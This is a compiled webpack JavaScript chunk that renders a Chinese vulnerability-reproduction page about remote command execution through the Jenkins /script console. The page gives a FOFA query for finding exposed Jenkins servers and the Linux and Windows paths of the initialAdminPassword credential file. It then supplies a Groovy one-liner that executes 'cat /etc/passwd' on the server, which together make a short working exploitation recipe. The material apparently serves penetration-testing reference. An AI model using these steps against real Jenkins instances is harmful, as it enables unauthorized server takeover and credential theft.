(window.webpackJsonp=window.webpackJsonp||[]).push([[595],{2695:function(s,a,t){s.exports=t.p+"assets/img/1629510961976-6518a8a9-cd7d-46b0-9bc5-67c07a1f9d7f.fd9a0567.png"},3347:function(s,a,t){"use strict";t.r(a);var n=t(64),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"jenkins-script-远程命令执行漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#jenkins-script-远程命令执行漏洞"}},[s._v("#")]),s._v(" Jenkins script 远程命令执行漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("Jenkins 登录后访问 /script 页面，其中存在命令执行漏洞，当存在未授权的情况时导致服务器被入侵")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("Jenkins")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[a("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJKZW5raW5zIg%3D%3D"}},[s._v('app="Jenkins"')])],1),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("账号密码存在于：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Linux: /var/lib/jenkins/secrets/initialAdminPassword\nWindows: C:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Users"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("RabbitMask"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(".jenkins"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("secrets"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("initialAdminPassword\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("登录后台，或在未授权的情况下访问")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("http://xxx.xxx.xxx.xxx/script\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("在脚本命命令模块执行系统命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("println "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'cat /etc/passwd'")]),s._v(".execute"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".text\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(2695),alt:"image.png"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);